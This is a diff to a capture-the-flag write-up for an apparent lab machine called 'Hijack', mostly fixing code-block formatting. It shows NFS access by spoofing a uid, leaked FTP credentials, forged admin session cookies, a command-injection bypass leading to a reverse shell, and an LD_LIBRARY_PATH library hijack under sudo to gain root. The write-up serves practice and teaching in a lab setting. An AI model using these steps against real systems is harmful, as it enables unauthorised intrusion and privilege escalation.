@@ -7,7 +7,8 @@
 # Reconnaisance:
 lets carry out a classic nmap scan
 ```bash
-nmap -sV -sC <target ipt> ```
+nmap -sV -sC <target ipt>
+```
 
 
 nmap scan:
@@ -53,23 +54,27 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
 
 thats good! lets mount the nfs share at /mnt/nfsshare
-``` bash
-showmount -e <target-ip> ```
+```bash
+showmount -e <target-ip>
+```
 
 we find the share /mnt/share *
 we mount it on our system
 
-``` bash
+```bash
 sudo mkdir /mnt/nfsshare 
-sudo mount -t nfs <target-ip>:/mnt/share /mnt/nfsshare -o nolock ```
+sudo mount -t nfs <target-ip>:/mnt/share /mnt/nfsshare -o nolock
+```
 
 we find out that we are denied of all permissions from accessing this share and only a user with 1003 permissions can access this share, so we quickly create a user named nfsuser with uid 1003 and access the nfsshare files
-``` bash
-sudo useradd -u 1003 -m nfsuser ```
+```bash
+sudo useradd -u 1003 -m nfsuser
+```
 
 now we access the nfsshare using this user
-``` bash
-sudo -u nfsuser cat nfsshare/for_employees.txt ```
+```bash
+sudo -u nfsuser cat nfsshare/for_employees.txt
+```
 
 ftp creds :
 
@@ -77,8 +82,9 @@ ftpuser:W3stV1rg1n14M0un741nM4m4
                  
 turns out that we cannot get the ftp files due to permission issues so we make a cheeky little modification to our get command
 
-``` bash
-get .from_admin.txt /dev/stdout ```
+```bash
+get .from_admin.txt /dev/stdout
+```
 local: /dev/stdout remote: .from_admin.txt
 229 Entering Extended Passive Mode (|||10723|)
 150 Opening BINARY mode data connection for .from_admin.txt (368 bytes).
@@ -249,7 +255,7 @@ patator is just being a bitch right now and none of the commands are working pro
 after exhausting all of our options, we use burpsuite to send a request to the /administrator.php page and put the cookies that we created using cookies_output.txt with the python script we made using deepseek
 
 the python script is 
-``` bash
+```bash
 import hashlib
 import base64
 import urllib.parse
@@ -280,12 +286,16 @@ with open('cookies_output.txt', 'w') as f:
     for cookie in cookies:
         f.write(cookie + '\n')
 
-print(f"\nGenerated {len(cookies)} cookies. Saved to 'cookies_output.txt'") ```
+print(f"\nGenerated {len(cookies)} cookies. Saved to 'cookies_output.txt'")
+```
 
                                                                        
-we get a suspicious response length at the php session cookie= YWRtaW46ZDY1NzNlZDczOWFlN2ZkZmIzY2VkMTk3ZDk0ODIwYTU%3D
+we get a suspicious response length at the php session cookie YWRtaW46ZDY1NzNlZDczOWFlN2ZkZmIzY2VkMTk3ZDk0ODIwYTU%3D
+in order to edit the session cookie, right click at the /administrator.php page and click on Inspect
+after that go to Storage and doule click on the 'value' of the Cookie session. paste this cookie instead YWRtaW46ZDY1NzNlZDczOWFlN2ZkZmIzY2VkMTk3ZDk0ODIwYTU%3D
+now press enter and just refresh the page
 
-we get administration access. now we should be able to exectute commands in the input field
+we get administration access. now we should be able to exectute commands in the input field. seems like there is some kind of RCE protection in the input box
 we can bypass the sanitization by putting a '&' sign before our commands, and we input a bash reverse shell into the input field
 
 
@@ -317,8 +327,9 @@ User rick may run the following commands on Hijack:
 
 using linpeas we found a 95% attack vector which was the env_keep+=LD_LIBRARY_PATH
 we are going to hijack the path by created am exploit script with some path hijacking
-``` bash
-ldd /usr/sbin/apache2 ```
+```bash
+ldd /usr/sbin/apache2
+```
 we get the output as:
   
         linux-vdso.so.1 =>  (0x00007ffd59f76000)
@@ -363,8 +374,9 @@ we compile it with the same name as the real library
 gcc -fPIC -shared -o /tmp/libcrypt.so.1 /tmp/libcrypt.c -ldl ```
 
 now we carry out the exploit using the command:
-``` bash
-sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2 ```
+```bash
+sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
+```
 
 boom! we have the root shell and we submit the root.txt flag!
                                                               
